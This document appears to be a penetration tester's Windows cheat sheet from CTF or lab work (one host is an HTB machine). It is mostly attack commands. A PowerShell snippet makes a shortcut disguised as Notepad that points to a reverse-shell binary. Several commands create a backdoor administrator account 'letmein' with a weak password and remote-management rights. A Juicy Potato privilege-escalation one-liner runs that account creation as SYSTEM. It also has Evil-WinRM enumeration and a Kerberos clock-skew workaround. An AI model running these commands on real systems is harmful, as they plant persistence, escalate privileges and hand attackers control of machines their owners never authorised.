# Shortcuts

## Create Shortcut (lnk)

```powershell
$shortcutPath = "C:\Common Applications\Notepad.lnk"
$targetPath = "C:\Users\Public\rev.exe"
$wscript = New-Object -ComObject WScript.Shell
$shortcut = $wscript.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $targetPath
$shortcut.Save()
```

## Add Program To Search Bar

1. Go to the folder your program is installed in, right click, select _Send to > Desktop (Create shortcut)_
2. Click Win+R and enter `%ProgramData%\Microsoft\Windows\Start Menu` to open the Start Menu folder in Windows Explorer
3. Move your new shortcut from the desktop to the Start Menu folder
4. If desired select the moved shortcut and press F2 to rename and remove the _- Shortcut_ text

[src](https://superuser.com/a/1662525)

## User Actions

### Create New Admin User

```powershell
# Create new user
net user <username> <password> /add

# Add to administrators group
net localgroup administrators <username> /add

# Add to remote management users group (for WinRM/PowerShell remoting)
net localgroup "Remote Management Users" <username> /add

# Example
net user letmein Password123$ /add && net localgroup administrators letmein /add && net localgroup "Remote Management Users" letmein /add
```

### Run commands as different user

```powershell
runas /user:<domain>\<username> "<command>"
runas /user:<username> "<command>"

# Example
runas /user:letmein "whoami"
```

## Versions

### Get product versions

```powershell
PS C:\xampp\htdocs\internal> wmic product get caption,version # Took like a minute to complete...
Caption                                                         Version
Office 16 Click-to-Run Extensibility Component                  16.0.17126.20132
Office 16 Click-to-Run Licensing Component                      16.0.17126.20132
Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.32.31332     14.32.31332
Microsoft Visual C++ 2022 X64 Additional Runtime - 14.32.31332  14.32.31332
LibreOffice 5.2.6.2                                             5.2.6.2
DefaultPackMSI                                                  4.6.2.0
VMware Tools                                                    12.0.6.20104755
...
```

### Check if UAC is active

```powershell
*Evil-WinRM* PS C:\Users\maya> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
	...
	EnableLUA    REG_DWORD    0x1
	...
```

## Kerberos

### KRB_AP_ERR_SKEW (Clock skew too great)

`nmap -sC {target}` displays the following information:
```bash
Host script results:
...
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
```

Kerberos is time sensitive application and this median means a lot, without proper clock sync the service might not work as expected.

If you're Linux (Base metal) you can sync with `ntpdate` (Requires admin privs)
```bash
└─$ sudo ntpdate puppy.htb
2025-07-04 19:23:41.102394 (-0400) +25201.545990 +/- 0.040566 puppy.htb 10.10.11.70 s1 no-leap
CLOCK: time stepped by 25201.545990
```

However if you're inside Virtual Machine this won't work, but we have information about SKEW.

Calculate the hour (without nmap)
```bash
└─$ echo $(( 25201.545990 / 60 / 60 ))
7.0004294416666664
```

`faketime` command can be used to bypass this restrcition.
```bash
faketime -f +{SKEW}h {command}
```

## Potatoes

### Juicy Potato

```powershell
.\jp.exe -t * -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/c net user letmein Password123! /add && net localgroup administrators letmein /add && net localgroup \"Remote Management Users\" letmein /add"
```